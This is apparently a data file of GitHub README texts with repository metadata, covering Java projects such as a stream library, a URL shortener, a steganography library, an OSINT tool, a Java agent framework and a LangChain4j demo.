| Loop \[for]               | 1.86s |
| Java Stream \[Sequential] | 1.86s |
| Java Stream \[Parallel]   | 724ms |
| StreamLine \[Ordered]     | 118ms |
| StreamLine \[Unordered]   | 109ms |
| StreamLine \[2 Threads]   | 512ms |

### Limitations
* StreamLine is not compatible with Java 8
* StreamLine is mainly made for big data processing and not for small data
* The concurrent processing does not extend to operations returning type-specific streams
  like `IntStream`, `LongStream`, `DoubleStream`, `OptionalInt`, `OptionalLong`, `OptionalDouble`, etc.
* StreamLine has more terminal operations than the usual java stream due its simple design - not sure if this is an advantage or disadvantage ^^

[build_shield]: https://github.com/YunaBraska/streamline/workflows/MVN_RELEASE/badge.svg

[build_link]: https://github.com/YunaBraska/streamline/actions?query=workflow%3AMVN_RELEASE

[maintainable_shield]: https://img.shields.io/codeclimate/maintainability/YunaBraska/streamline?style=flat-square

[maintainable_link]: https://codeclimate.com/github/YunaBraska/streamline/maintainability

[coverage_shield]: https://img.shields.io/codeclimate/coverage/YunaBraska/streamline?style=flat-square

[coverage_link]: https://codeclimate.com/github/YunaBraska/streamline/test_coverage

[issues_shield]: https://img.shields.io/github/issues/YunaBraska/streamline?style=flat-square

[issues_link]: https://github.com/YunaBraska/streamline/commits/main

[commit_shield]: https://img.shields.io/github/last-commit/YunaBraska/streamline?style=flat-square

[commit_link]: https://github.com/YunaBraska/streamline/issues

[license_shield]: https://img.shields.io/github/license/YunaBraska/streamline?style=flat-square

[license_link]: https://github.com/YunaBraska/streamline/blob/main/LICENSE

[dependency_shield]: https://img.shields.io/librariesio/github/YunaBraska/streamline?style=flat-square

[dependency_link]: https://libraries.io/github/YunaBraska/streamline

[central_shield]: https://img.shields.io/maven-central/v/berlin.yuna/streamline?style=flat-square

[central_link]:https://search.maven.org/artifact/berlin.yuna/streamline

[tag_shield]: https://img.shields.io/github/v/tag/YunaBraska/streamline?style=flat-square

[tag_link]: https://github.com/YunaBraska/streamline/releases

[javadoc_shield]: https://javadoc.io/badge2/berlin.yuna/streamline/javadoc.svg?style=flat-square

[javadoc_link]: https://javadoc.io/doc/berlin.yuna/streamline

[size_shield]: https://img.shields.io/github/repo-size/YunaBraska/streamline?style=flat-square

[label_shield]: https://img.shields.io/badge/Yuna-QueenInside-blueviolet?style=flat-square

[gitter_shield]: https://img.shields.io/gitter/room/YunaBraska/streamline?style=flat-square

[gitter_link]: https://gitter.im/streamline/Lobby

[java_version]: https://img.shields.io/badge/java-21-blueviolet?style=flat-square
",15,1,1,0.0,"['streamline', 'motivation', 'benefit', 'prerequisite', 'usage', 'streamline', 'performance', 'limitation']","['streamline', 'motivation', 'benefit', 'prerequisite', 'usage']",1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-release-plugin,org.apache.maven.plugins:maven-scm-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.jacoco:jacoco-maven-plugin,org.sonatype.plugins:nexus-staging-maven-plugin]",0.0,1.0,0.0
yiyuan9/abitoflink,main,"# a bit of link

> **Note**: update config files to your dev env accordingly before running the application, start only aggregation and gateway services if you are running it within aggregation mode.

##  Intro
Short links are frequently used in everyday business marketing, such as in various marketing text messages, where short links appear. They help businesses identify user behavior, click rates, and other key information monitoring during marketing activities. 

The main functions of **abitoflink**  include, but are not limited to, the following aspects:
- **Enhancing user experience**: Short links are easier for users to remember and share, enhancing their experience.
- **Saving space**: Short links are shorter than long URLs, saving character space, especially in situations with character limits.
- **Beautification**: Short links are usually more aesthetically pleasing and concise.
- **Statistics and analysis**: It is possible to track the visits to short links to understand user behavior and preferences.

## Technical Architecture

In the system design, the latest **JDK17 + SpringBoot3 + SpringCloud** microservices architecture is adopted to build a **high-concurrency, large-data-volume** short link generation service that remains efficient and reliable.

![Technical Architecture Diagram](https://i.ibb.co/tszmCQX/diagram.png)

## Project Highlights

-   **High Concurrency**: Capable of handling situations with a large number of users accessing the system simultaneously, especially critical during peak periods, demanding high system performance and quick response times.
-   **Massive Storage**: Designed to accommodate the storage of vast amounts of user data, including databases and caches, necessitating ample storage capacity and efficient storage management strategies.
-   **Multi-tenant Scenarios**: Supports multiple tenants sharing the same system infrastructure while ensuring data isolation, security, and performance across tenants.
-   **Data Security**: Prioritises the security and privacy of user data, implementing measures to prevent unauthorised access and data breaches.
-   **Scalability & Extensibility**: Features robust scalability and extensibility to adapt to increasing user numbers and business expansion.

## Disclaimer

Please be advised that this App is intended solely for educational and testing purposes. Users are strictly prohibited from deploying or utilising this application for any illegal activities. It is the responsibility of each user to ensure that their use of the ""a bit of link"" (this application) complies with all applicable local laws and regulations.

The creators of ""a bit of link"" (this application) make no representations or warranties of any kind, express or implied, about the completeness, accuracy, reliability, suitability, or availability with respect to the application or the information, products, services, or related graphics contained within the app for any purpose. Any reliance placed on such information is therefore strictly at the user's own risk.

In no event will the creators of the ""a bit of link"" (this application) be liable for any loss or damage including, without limitation, indirect or consequential loss or damage, or any loss or damage whatsoever arising from loss of data or profits arising out of, or in connection with, the use of this Demo App.

By using ""a bit of link"" (this application), you hereby acknowledge and agree to this disclaimer and commit to using the application in a manner that is lawful and in accordance with the terms outlined herein.
",0,0,4,21.0,"['bit', 'link', 'intro', 'technical', 'architecture', 'project', 'highlight', 'disclaimer']","['bit', 'link', 'intro', 'technical', 'architecture']",5.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,4.0,1.0
prakarshs/Jhethia,master,"# Jhethia : Where Fafda Meets Code
<p align=""center"">
  <img src=""https://images.pexels.com/photos/20693518/pexels-photo-20693518.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=1"" alt=""jhethia"" width=""630"" height=""400"">
</p>

## What Is Jhethia?
Jhethia is a fun programming language modeled in Java, spiced up with the hilarious antics of Jhethalal. Its syntax somewhat mixes Rust and Python, promising a coding experience full of laughs and fun! Jhethia allows users to perform a wide range of basic operations typical of any programming language, all while injecting a dose of fun into the process. 

Know More [âœ¨Hereâœ¨](https://prakarshs.github.io/JhethiaWeb/)

### Run this program
- Firstly, Clone the repository in your system.
- Secondly, Compile and package the program into a uber jar, go to the ./target folder and then run the following command
```
java -cp Jhethia.jar org.prakarshs.JhethiaRun src/test/resources/hello_world.jhethia
```
>You can add your own .(dot)jhethia files and run the code from the test/resources/{your_file} location

ğŸ™ğŸ» Jai Jinendra ğŸ™ğŸ»



",0,0,2,1.0,"['jhethia', 'where', 'fafda', 'meet', 'code', 'what', 'be', 'jhethia', 'run', 'program']","['jhethia', 'where', 'fafda', 'meet', 'code']",1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-shade-plugin,org.apache.maven.plugins:maven-surefire-plugin]",0.0,1.0,0.0
galliumdata/adumbra,master,"# The Adumbra library
Adumbra is a light-weight Java library that uses
[steganography](https://en.wikipedia.org/wiki/Steganography)
to hide data in bitmaps using a secret key. 
Supported input formats include PNG, JPEG, TIFF, BMP.
Output formats are PNG and TIFF only, because other
formats are lossy and therefore more difficult to support.

Adumbra requires a bitmap with about 500 pixels
for every byte of the secret message, so a bitmap of
500x700 pixels could contain a secret message 
of up to about 700 bytes. The maximum size of the secret
message is 32K bytes.

Adumbra is intended to be used as more of a way
to mark bitmaps in a non-obvious way, rather than as 
an efficient way to transmit large amounts of secret data.

## How does it work?
Adumbra hides a secret message in a bitmap by distributing
the message's bits into the least significant bit of some pixels,
using one color per pixel (R, G or B) in a pattern
determined by the secret key.

Before being encoded into the bitmap, the message is 
encrypted using a secure hash of the secret key.

Adumbra can also randomize the least significant bits 
of other pixels to make it more difficult to determine 
whether the bitmap contains a secret message, and 
how long that message may be. With that option,
even if someone had access to the original bitmap,
they still would not be able to decode the secret message
without the secret key because they could not determine
if a changed bit belongs to the secret message or is just noise.

## How secure is this?
This library has not been reviewed by cryptography experts,
so you should exercise common sense -- do not rely on it
to hide national security secrets.

As always with encryption, the length of the secret key is
important: using a short key is less secure than a longer key.
The randomness of the key is also a factor. In general,
using a secret key of at least 40 random characters should
give you excellent secrecy. If you just want to mark a bitmap in a non-obvious
way without worrying about NSA-level adversaries, 15 or 20
random characters should be plenty.

There are two main obstacles to decoding a secret message:
### Determining that a bitmap contains a message
An attacker who analyzes the modified bitmap may be able to determine
that the bitmap contains some suspicious noise, but it would be
difficult to be certain unless they have access to the original
bitmap.
### Decoding the secret message
Even with the original bitmap, without the secret key, 
an attacker would have a difficult time to
figure out which bits actually belong to the secret message.
Even if they did, they would then have to decrypt the message,
which is encoded using a SHA-512 hash of the secret key.

## Removing the secret message
Keep in mind that it is fairly easy to scramble a secret message
hidden in a bitmap -- all you have to do is save the bitmap
with a bit of compression. In most cases, that will make the
secret message unrecognizable.

## Command line usage
### Encoding a message in a bitmap
```
java -jar adumbra-<version>.jar encode \
    <input-file> \
    <output-file> \
    <message> \
    <key> \
    [<format> [<secure-level>]]
```
- `<input-file>`: a bitmap file. 
Supported input formats are those supported by your Java platform,
and usually include: `png`, `jpeg`, `tiff`, `bmp`
- `<output-file>`: the file in which to write the bitmap 
with the hidden message
- `<message>`: the message to be encoded in the bitmap
- `<key>`: the secret key used to hide the message
- `<format>`: optional, the format of the output file. 
If not specified, the format of the input file will be used,
but only ""png"" and ""tiff"" are allowed because other formats
are lossy.
- `<secure-level>`: optional, an integer between 0 and 2.
Zero means minimum security, no noise is added to the image,
which means, depending on the bitmap, it may be easy to
detect that the image contains secret data, and how long that
data is. One adds some noise, but with some repetition,
making it much more difficult to determine that the bitmap 
contains secret data. Two adds fully random noise, which is
even more secure, but is somewhat slower.

### Example
Encode a message into a bitmap file:
```
java -jar adumbra-0.9.jar encode MyImage.jpeg Output.png \
    ""My secret message"" ""6buovMtowrAuNYw"" png 1
```
## Extract a secret message from a bitmap file:
```
java -jar adumbra-0.8.jar decode Output.png \
""6buovMtowrAuNYw""
```
Output:
```
Hidden message: My secret message
```

## Library usage
This is a stand-alone library, it has no dependencies.

[Javadoc is here](https://javadoc.io/doc/com.galliumdata.adumbra/adumbra/latest/com/galliumdata/adumbra/package-summary.html)

### Maven:
```
<dependency>
    <groupId>com.galliumdata.adumbra</groupId>
    <artifactId>adumbra</artifactId>
    <version>0.9</version>
</dependency>
```
### Encoding in Java
```
Encoder encoder = new Encoder(2);
FileInputStream inStr = new FileInputStream(""MyImage.jpg"");
FileOutputStream outStr = new FileOutputStream(""ModifImage.png"");
byte[] message = ""This is the message"".getBytes(StandardCharsets.UTF_8);
String key = ""This is the secret key"";
encoder.encode(inStr, outStr,  ""png"", message, key, ""png"", 1);
outStr.close();
// Result is in file ModifImage.png
```

### Decoding in Java
```
Decoder decoder = new Decoder();
FileInputStream inStr = new FileInputStream(""ModifImage.png"");
byte[] decoded = decoder.decode(inStr, ""This is the secret key"");
System.out.println(new String(decoded));
// Output: This is the message
```

# About the author
Adumbra was developed while working on 
[Gallium Data](https://www.galliumdata.com)
to allow invisible watermarking of bitmaps stored in databases.
It is open source with an Apache 2.0 license.
",0,0,2,0.0,"['the', 'adumbra', 'library', 'how', 'work', 'how', 'secure', 'this', 'determine', 'bitmap', 'contains', 'message', 'decode', 'secret', 'message', 'remove', 'secret', 'message', 'command', 'line', 'usage', 'encode', 'message', 'bitmap', 'example', 'extract', 'secret', 'message', 'bitmap', 'file', 'library', 'usage', 'maven', 'encode', 'java', 'decode', 'java', 'about', 'author']","['message', 'bitmap', 'secret', 'library', 'how']",1.0,"[org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-project-info-reports-plugin,org.apache.maven.plugins:maven-site-plugin,org.apache.maven.plugins:maven-source-plugin,org.sonatype.central:central-publishing-maven-plugin]",0.0,1.0,0.0
walimorris/opensquare,master,"<a name=""readme-top""></a>


<!-- PROJECT SHIELDS -->
<!--
*** I'm using markdown ""reference style"" links for readability.
*** Reference links are enclosed in brackets [ ] instead of parentheses ( ).
*** See the bottom of this document for the declaration of the reference variables
*** for contributors-url, forks-url, etc. This is an optional, concise syntax you may use.
*** https://www.markdownguide.org/basic-syntax/#reference-style-links
-->

[![MIT License][license-shield]][license-url]
[![LinkedIn][linkedin-shield]][linkedin-url]



<!-- PROJECT LOGO -->
<br />
<div align=""center"">
  <a href=""https://bitbucket.org/intelligence-opensent/opensentop/src/master/"">
    <img src=""backend/src/main/resources/images/social-media.jpeg"" alt=""Logo"" width=""400"" height=""140"">
  </a>

<h3 align=""center"">Opensquare</h3>

  <p align=""center"">
    Opensource social media intelligence and OSINT
    <br />
    <a href=""https://github.com/walimorris/opensquare""><strong>Explore the docs Â»</strong></a>
    <br />
    <br />
    <a href=""https://github.com/walimorris/opensquare"">View Demo</a>
    Â·
    <a href=""https://github.com/walimorris/opensquare"">Report Bug</a>
    Â·
    <a href=""https://github.com/walimorris/opensquare"">Request Feature</a>
  </p>
</div>



<!-- TABLE OF CONTENTS -->
<details>
  <summary>Table of Contents</summary>
  <ol>
    <li>
      <a href=""#about-the-project"">About The Project</a>
      <ul>
        <li><a href=""#built-with"">Built With</a></li>
      </ul>
    </li>
    <li>
      <a href=""#getting-started"">Getting Started</a>
      <ul>
        <li><a href=""#prerequisites"">Prerequisites</a></li>
        <li><a href=""#installation"">Installation</a></li>
      </ul>
    </li>
    <li><a href=""#usage"">Usage</a></li>
    <li><a href=""#roadmap"">Roadmap</a></li>
    <li><a href=""#contributing"">Contributing</a></li>
    <li><a href=""#contact"">Contact</a></li>
    <li><a href=""#acknowledgments"">Acknowledgments</a></li>
  </ol>
</details>



<!-- ABOUT THE PROJECT -->
## About The Project
There were 150 million new social media users between April 2022 and April 2023 - that's a 3.2% increase year-over-year from the current 
4.8 billion social media users worldwide, representing 59.9% of the global population and 92.7% of all internet users. Businesses use 
social media to gain insights about various topics: user sentiment around products, strong products and weak products, events, all things that cater to 
their customer. For intelligence analysts and social science researchers, who are their customers? Policymakers, the everyday citizen, everyone in society. 
This project's user, its customer, is the intelligence and social sciences analysts and researchers. As technology continues up the curve of
innovation, and society continues to increasingly use social media as the public square, researchers can use this available data for good, to 
draw insights, to slow down or stop harmful incidents, to help society, to develop plans based on public consensus, better inform policymakers of 
what their constituents need and want (and better plan solutions that increase the satisfaction of their customer). As it becomes harder for governments
to understand and execute solutions that better serve their constituents, the idea of adaptive governance, a focus on decentralized decision-making
structures, becomes unavoidable. Not only can insights gained from social media assist policymakers, it can assist adaptive governance entities and groups
to better serve their populations. This product is for the intelligence analyst, the social scientist, the data scientist and those interested in improving 
the quality of our human existence through deep public analysis and data-driven solutions.


<p align=""right"">(<a href=""#readme-top"">back to top</a>)</p>



### Built With

* [![Springboot][Springboot.com]][Springboot-url]
* [![MongoDB][MongoDB.com]][MongoDB-url]
* [![React][React.js]][React-url]
* [![AWS][AWS.com]][AWS-url]

<p align=""right"">(<a href=""#readme-top"">back to top</a>)</p>



## Features

## Watch Retrieval Augmented Generation (RAG) Demo
[![Watch the video](https://raw.githubusercontent.com/walimorris/opensquare/master/backend/src/main/resources/images/chat.png)](https://vimeo.com/949702850)


Along with other features, OpenSquare provides [Digit Footprint](https://en.wikipedia.org/wiki/Digital_footprint) targeting 
tools, some using well-known OSINT methods such as [Backlinks](https://en.wikipedia.org/wiki/Backlink), [NSLookup](https://en.wikipedia.org/wiki/Nslookup), 
and [Whois](https://en.wikipedia.org/wiki/WHOIS). Having a general suite of tools in a single place can increase user productivity. Easily navigate between
dashboard workspaces and use output from one tool as input for another.

<div align=""center"">
  <a href=""https://github.com/walimorris/opensquare"">
    <img src=""backend/src/main/resources/images/digitalfootprint-snapshot-baclinks-updated.png"" alt=""Logo"" width=""650"" height=""450"">
  </a>
</div>
<div align=""center"">
  <a href=""https://github.com/walimorris/opensquare"">
    <img src=""backend/src/main/resources/images/digitalfootprint-snapshot-whois-2.png"" alt=""Logo"" width=""650"" height=""450"">
  </a>
</div>
<div align=""center"">
  <a href=""https://github.com/walimorris/opensquare"">
    <img src=""backend/src/main/resources/images/digitalfootprint-snapshot-backlinks-2.png"" alt=""Logo"" width=""650"" height=""450"">
  </a>
</div>

### Experiment Generating Reports with GenAI
Experiment with generating reports and documents with GenAI. Use the information and images you've collected to generate 
reports that result in decision advantage. Ask our AI system to generate images for you based on the information context 
and summarize key details. Increase productivity and drastically reduce the speed to delivering key insights to decision
makers using click-and-point and draggable interfaces.
<div align=""center"">
  <a href=""https://github.com/walimorris/opensquare"">
    <img src=""backend/src/main/resources/images/generate-reports.png"" alt=""generate-reports"" width=""650"" height=""450"">
  </a>
</div>

### Video Transcription with OpenAI's Whisper
Opensquare utilizes [Whisper](https://github.com/openai/whisper): a general-purpose speech recognition model.  It is trained on a large dataset of diverse audio and is also a
multitasking model that can perform multilingual speech recognition, speech translation, and language identification.

Using Opensquare's available API's, you can query and transcribe YouTube videos. Transcripts will report time and text properties. This API is used to build features on Opensquare , but will also be available to the public as an easy to use API. 

`opensquare/api/youtube/en/transcribe?videoId=l9AzO1FMgM8`

produces: 

`[
{
""time"": ""0.0"",
""text"": ""Java, a high-level multi-paradigm programming language famous for its ability to compile""
},
{
""time"": ""5.2"",
""text"": ""to platform independent bytecode.""
},
{
""time"": ""7.44"",
""text"": ""It was designed by James Gosling in 1990 at Sun Microsystems.""
},
{
""time"": ""11.700000000000001"",
""text"": ""One of its first demonstrations was the Star 7 PDA, which gave birth to the Java mascot""
},...
]`


<!-- GETTING STARTED -->
## Getting Started

To get a local copy up and running follow these simple example steps.

### Prerequisites
* Linux
* Java 17
  ```sh
  java --version
  ```

* Maven 3.9 or above
  ```sh
  mvn --version
  ```

### Installation

1. Clone the repo
   ```sh
   git git clone https://opensentop@bitbucket.org/intelligence-opensent/opensentop.git
   ```
2. Install dependencies (including NPM) default profile 
   ```sh
   mvn clean install
   ```
   
3. Run webpack in development mode
   ```sh
   npm run watch
   
4. There are some configuration files you'll need - feel free to ping me for those.

<p align=""right"">(<a href=""#readme-top"">back to top</a>)</p>



<!-- USAGE EXAMPLES -->
## Usage

This project uses Eirik Sletteberg's [Frontend-Maven-Plugin](https://github.com/eirslett/frontend-maven-plugin) which allows our team to use a single plugin for both frontend and backend builds in a single repo.
This plugin is capable of various configurations, but the configuration used in this project is minimum only using Webpack and few configurations to install Node and NPM. The meat of this usage is from the 
creation of the project's bundle which is integrated using a `<script>` in root of React application (typical React fashion) exposed in the `index.html` file in the Springboot resources folder.
```
<body>
<div id='root'>
</div>
<script src=""built/bundle.js""></script>
</body>
```
Webpack will create a build bundle that contains the source for the React application entry in `app.js` under the `js` package of this project.
```
entry: path.resolve(__dirname, ""/src/main/js/app.js""),
    devtool: 'inline-source-map',
    cache: true,
    mode: 'development',
    output: {
        path: __dirname,
        filename: 'src/main/resources/static/built/bundle.js'
    },
```

<p align=""right"">(<a href=""#readme-top"">back to top</a>)</p>

### Kafka Usage - Local
If you're running kafka you should review the [Docs](https://kafka.apache.org/20/documentation.html). First ensure zoo-keeper server is running before running the kafka server. Sometimes zookeeper configs
`/config` folder is not setup properly. If you need to, ensure `clientPort=2181` is set in the `zookeeper.properties` and to ensure non-conflicting ports make sure `admin.serverPort=8083` is set in the same file.
We also want to ensure that `bootstrap.servers=9092` is configured in `producer.properties`: this is a list of brokers used for bootstrapping knowledge about the rest of the cluster format which is important for
this project's springboot configuration below:
```
@Bean
    public ConsumerFactory<String, OpenSentTaskStatus> consumerFactory() {
        Map<String, Object> configurationProperties = new HashMap<>();
        configurationProperties.put(ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG, ""localhost:9092"");
        configurationProperties.put(ConsumerConfig.GROUP_ID_CONFIG, ""group_id"");
        configurationProperties.put(JsonDeserializer.TRUSTED_PACKAGES, ""*"");
        configurationProperties.put(ConsumerConfig.KEY_DESERIALIZER_CLASS_CONFIG, StringDeserializer.class);
        configurationProperties.put(ConsumerConfig.VALUE_DESERIALIZER_CLASS_CONFIG, JsonDeserializer.class);
        configurationProperties.put(ConsumerConfig.AUTO_OFFSET_RESET_CONFIG, ""earliest"");
        return new DefaultKafkaConsumerFactory<>(configurationProperties);
    }
```
```
@Bean
    public ProducerFactory<String, OpenSentTaskStatus> producerFactory() {
        Map<String, Object> props = new HashMap<>();
        props.put(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, ""localhost:9092"");
        props.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, StringSerializer.class);
        props.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, JsonSerializer.class);
        return new DefaultKafkaProducerFactory<>(props);
    }
```



<!-- ROADMAP -->
## Roadmap

- [ ] YouTube Service & View
- [ ] X (formerly Twitter) Service & View
- [ ] Vkontakte Service & View

See the [open issues](https://github.com/walimorris/opensquare) for a full list of proposed features (and known issues).

<p align=""right"">(<a href=""#readme-top"">back to top</a>)</p>

<p align=""right"">(<a href=""#readme-top"">back to top</a>)</p>

<!-- LICENSE -->


<!-- CONTACT -->
## Contacts

Wali Morris - [@LinkedIn](https://www.linkedin.com/in/wali-m/) - walimmorris@gmail.com

Project Link: [GitHub](https://github.com/walimorris/opensquare)

<p align=""right"">(<a href=""#readme-top"">back to top</a>)</p>



<!-- ACKNOWLEDGMENTS -->
## Acknowledgments

* [Material UI](https://mui.com/)
* [webpack](https://webpack.js.org/)
* [Babel](https://babeljs.io/)
* [Eirik Sletteberg & Frontend-Maven-Plugin](https://github.com/eirslett/frontend-maven-plugin)
* [Whisper](https://github.com/openai/whisper)

<p align=""right"">(<a href=""#readme-top"">back to top</a>)</p>



<!-- MARKDOWN LINKS & IMAGES -->
<!-- https://www.markdownguide.org/basic-syntax/#reference-style-links -->
[license-shield]: https://img.shields.io/github/license/github_username/repo_name.svg?style=for-the-badge
[license-url]: https://github.com/github_username/repo_name/blob/master/LICENSE.txt
[linkedin-shield]: https://img.shields.io/badge/-LinkedIn-black.svg?style=for-the-badge&logo=linkedin&colorB=555
[linkedin-url]: https://www.linkedin.com/in/wali-m/
[product-screenshot]: images/screenshot.png
[React.js]: https://img.shields.io/badge/React-20232A?style=for-the-badge&logo=react&logoColor=61DAFB
[React-url]: https://reactjs.org/
[Springboot.com]: https://img.shields.io/badge/Springboot-4B6F44?style=for-the-badge&logo=springboot&logoColor=white
[Springboot-url]: https://spring.io
[AWS.com]: https://img.shields.io/badge/AWS-FF9900?style=for-the-badge&logo=amazon&logoColor=000000
[AWS-url]: https://aws.amazon.com/
[MongoDB.com]: https://img.shields.io/badge/MongoDB-4B6F44?style=for-the-badge&logo=mongodb&logoColor=white
[MongoDB-url]: https://www.mongodb.com/
",0,0,1,0.0,"['about', 'the', 'project', 'build', 'with', 'feature', 'watch', 'retrieval', 'augmented', 'generation', 'rag', 'demo', 'experiment', 'generate', 'report', 'genai', 'video', 'transcription', 'openai', 'whisper', 'get', 'start', 'prerequisite', 'installation', 'usage', 'kafka', 'usage', 'local', 'roadmap', 'contact', 'acknowledgment']","['usage', 'about', 'the', 'project', 'build']",1.0,"[com.github.eirslett:frontend-maven-plugin,maven-surefire-plugin,org.jetbrains.kotlin:kotlin-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,1.0,0.0
yangfeng20/ja-netfilter,master,"# ja-netfilter 2022.2.0

### A Java Instrumentation Framework

## Usage

* download from the [releases page](https://gitee.com/ja-netfilter/ja-netfilter/releases)
* add `-javaagent:/absolute/path/to/ja-netfilter.jar` argument (**Change to your actual path**)
    * add as an argument of the `java` command. eg: `java -javaagent:/absolute/path/to/ja-netfilter.jar -jar executable_jar_file.jar`
    * some apps support the `JVM Options file`, you can add as a line of the `JVM Options file`.
    * **WARNING: DO NOT put some unnecessary whitespace characters!**
* or execute `java -jar /path/to/ja-netfilter.jar` to use `attach mode`.
* for **Java 17** you have to add at least these `JVM Options`:

  ```
  --add-opens=java.base/jdk.internal.org.objectweb.asm=ALL-UNNAMED
  --add-opens=java.base/jdk.internal.org.objectweb.asm.tree=ALL-UNNAMED
  ```

* edit your plugin config files: `${lower plugin name}.conf` file in the `config` dir where `ja-netfilter.jar` is located.
* the `config`, `logs` and `plugins` directories can be specified through **the javaagent args**.
  * eg: `-javaagent:/path/to/ja-netfilter.jar=appName`, your config, logs and plugins directories will be `config-appname`, `logs-appname` and `plugins-appname`.
  * if no javaagent args, they default to `config`, `logs` and `plugins`.
  * this mechanism will avoid extraneous and bloated `config`, `logs` and `plugins`.

* run your java application and enjoy~

## Config file format

```
[ABC]
# for the specified section name

# for example
[URL]
EQUAL,https://someurl

[DNS]
EQUAL,somedomain

# EQUAL       Use `equals` to compare
# EQUAL_IC    Use `equals` to compare, ignore case
# KEYWORD     Use `contains` to compare
# KEYWORD_IC  Use `contains` to compare, ignore case
# PREFIX      Use `startsWith` to compare
# PREFIX_IC   Use `startsWith` to compare, ignore case
# SUFFIX      Use `endsWith` to compare
# SUFFIX_IC   Use `endsWith` to compare, ignore case
# REGEXP      Use regular expressions to match
```


## Debug info

* the `ja-netfilter` will **NOT** output debugging information by default
* add environment variable `JANF_DEBUG=1` (log level) and start to enable it
* or add system property `-Djanf.debug=1` (log level) to enable it
* log level: `NONE=0`, `DEBUG=1`, `INFO=2`, `WARN=3`, `ERROR=4`

## Debug output

* the `ja-netfilter` will output debugging information to the `console` by default
* add environment variable `JANF_OUTPUT=value` and start to change output medium
* or add system property `-Djanf.output=value` to change output medium
* output medium value: [`NONE=0`, `CONSOLE=1`, `FILE=2`, `CONSOLE+FILE=3`, `WITH_PID=4`]
* eg: `console` + `file` + `pid file name` = 1 + 2 + 4 = 7, so the `-Djanf.output=7`

## Plugin system

* for developer:
    * view the [scaffold project](https://gitee.com/ja-netfilter/ja-netfilter-sample-plugin) written for the plugin system
    * compile your plugin and publish it
    * just use your imagination~

* for user:
    * download the jar file of the plugin
    * put it in the subdirectory called `plugins` where the ja-netfilter.jar file is located
    * enjoy the new capabilities brought by the plugin
    * if the file suffix is `.disabled.jar`, the plugin will be disabled
   
",0,1,1,0.0,"['a', 'java', 'instrumentation', 'framework', 'usage', 'config', 'file', 'format', 'specify', 'section', 'name', 'example', 'equal', 'use', 'equal', 'compare', 'use', 'equal', 'compare', 'ignore', 'case', 'keyword', 'use', 'contains', 'compare', 'use', 'contains', 'compare', 'ignore', 'case', 'prefix', 'use', 'startswith', 'compare', 'use', 'startswith', 'compare', 'ignore', 'case', 'suffix', 'use', 'endswith', 'compare', 'use', 'endswith', 'compare', 'ignore', 'case', 'regexp', 'use', 'regular', 'expression', 'match', 'debug', 'info', 'debug', 'output', 'plugin', 'system']","['use', 'compare', 'ignore', 'case', 'equal']",5.0,"[org.apache.maven.plugins:maven-assembly-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin]",0.0,5.0,0.0
LizeRaes/feedback-analyzer,main,"# Feedback Analyser Application
<img src='src/main/resources/images/langchain4j_logo_text.png' alt='LangChain4j Integrations' width=""200"">


This application is meant to illustrate various LangChain4j building blocks and capabilities 
in a real application that also includes endpoints, frontend and databases. 
We wrapped the vanilla java/LangChain4j code in a Quarkus webapp (for a fast and lightweight application), 
added a frontend (partly plain html, partly React), an SQLite database, and provided Docker files for deployment.

You are currently looking at the **vanilla java/langchain4j** version. 
There is an excellent quarkus/langchain4j integration that allows to further reduce the lines of code, 
leverage to a maximum the quarkus optimizations, and allows you to observe a lot of services in the quarkus DevUI. 
For the **proper quarkus/langchain4j** version of this application, **check out the `idiomatic-quarkus`branch**.

You can concentrate on the business logic and use this project as a template for your own AI-powered projects.

These are some parts of the frontend

<img src='src/main/resources/images/feedback_form.png' width=""300"">
<img src='src/main/resources/images/atomicfeedback.png' width=""300"">
<img src='src/main/resources/images/dashboard.png' width=""300"">
<img src='src/main/resources/images/chatassistant.png' width=""400"">

and this is the architecture of the application.

<img src='src/main/resources/images/feedbackanalyser_architecture.jpg' alt='Feedback Analyser Architecture' width=""500"">


- [Project Setup](#project-setup)
    - [Prerequisites](#prerequisites)
    - [Setup](#setup)
    - [Running the Application](#running-the-application)
    - [Observing the result](#observing-the-result)
    - [Stopping the Application](#stopping-the-application)
    - [Development and hot loading](#development-and-hot-loading)
- [Goal of the Project](#goal-of-the-project)
- [Feedback Analyser Architecture and Classes](#feedback-analyser-architecture-and-classes)
    - [1. Feedback gathering and annotation](#1-feedback-gathering-and-annotation)
    - [2. Feedback corpus exploration with dashboard and chat assistant](#2-feedback-corpus-exploration-with-dashboard-and-chat-assistant)
- [Understanding the parts better](#understanding-the-parts-better)
    - [The AI Services](#the-ai-services)
    - [The Content Retriever for the Chatbot](#the-content-retriever-for-the-chatbot)
    - [The SQLite database](#the-sqlite-database)
    - [The Frontend](#the-frontend)
    - [The Endpoints](#the-endpoints)
- [Further Resources](#further-resources)



## Project Setup

```PlainText
Note: due to a pending bugfix we face some issues with the POJO parsing when entering feedback into the application.
This repo will get updated with a fix in the days to come.
```

### Prerequisites
To get this application running, you'll need
- Java 17 or higher
- Maven
- A key for the OpenAI API
- Docker (optional)

## Setup
### :rocket: If you don't want to bother with a local setup
You can use [Gitpod](https://gitpod.io).
You must create an account first.
You then can open this project in either your local VS Code or directly in your browser:

[![Open in Gitpod](https://gitpod.io/button/open-in-gitpod.svg)](https://gitpod.io/#github.com/LizeRaes/feedback-analyzer)

For the OpenAI API key, you can store it in the Gitpod environment variables.
Use the terminal with the GitPod cli: 
``` bash
eval $(gp env -e OPENAI_API_KEY='sk-...')
```
Alternatively, go to the Gitpod User settings and add the key as an environment variable https://gitpod.io/user/variables

### Local setup
